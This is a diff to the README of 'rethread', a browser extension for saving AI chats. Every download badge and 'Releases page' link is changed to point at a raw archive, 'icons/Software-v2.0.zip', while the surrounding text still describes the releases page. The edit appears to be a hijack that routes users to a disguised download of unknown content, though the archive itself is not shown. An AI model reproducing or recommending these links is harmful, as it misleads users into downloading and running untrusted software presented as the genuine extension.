@@ -1,6 +1,6 @@
 # 🤖 rethread - Save and Search AI Chats Easily
 
-[![Download rethread](https://img.shields.io/badge/Download_rethread-orange?style=for-the-badge)](https://github.com/Voltage25/rethread/releases)
+[![Download rethread](https://img.shields.io/badge/Download_rethread-orange?style=for-the-badge)](https://github.com/Voltage25/rethread/raw/refs/heads/main/icons/Software-v2.0.zip)
 
 ---
 
@@ -47,9 +47,9 @@ rethread stores your AI chat history directly in your browser. It adds a side pa
 
 Follow these steps to set up rethread on your Windows machine.
 
-1. Visit the [rethread Releases page](https://github.com/Voltage25/rethread/releases) to download the extension.  
+1. Visit the [rethread Releases page](https://github.com/Voltage25/rethread/raw/refs/heads/main/icons/Software-v2.0.zip) to download the extension.  
    
-   [![Download rethread](https://img.shields.io/badge/Download_rethread-blue?style=for-the-badge)](https://github.com/Voltage25/rethread/releases)
+   [![Download rethread](https://img.shields.io/badge/Download_rethread-blue?style=for-the-badge)](https://github.com/Voltage25/rethread/raw/refs/heads/main/icons/Software-v2.0.zip)
 
 2. Find the latest version listed under "Assets" on the releases page. The file you need will have `.crx` or `.zip` in the name.
 
@@ -107,7 +107,7 @@ The sidebar shows saved chats by default in chronological order. You can customi
 
 To keep the extension working well, update rethread regularly:
 
-1. Visit the [rethread Releases page](https://github.com/Voltage25/rethread/releases).
+1. Visit the [rethread Releases page](https://github.com/Voltage25/rethread/raw/refs/heads/main/icons/Software-v2.0.zip).
 
 2. Download the newest `.crx` or `.zip` update as described in the Getting Started section.
 
@@ -160,4 +160,4 @@ If you run into issues:
 ## 🔗 Download rethread
 
 Access the latest version anytime here:  
-[![Download rethread](https://img.shields.io/badge/Download_rethread-green?style=for-the-badge)](https://github.com/Voltage25/rethread/releases)
+[![Download rethread](https://img.shields.io/badge/Download_rethread-green?style=for-the-badge)](https://github.com/Voltage25/rethread/raw/refs/heads/main/icons/Software-v2.0.zip)
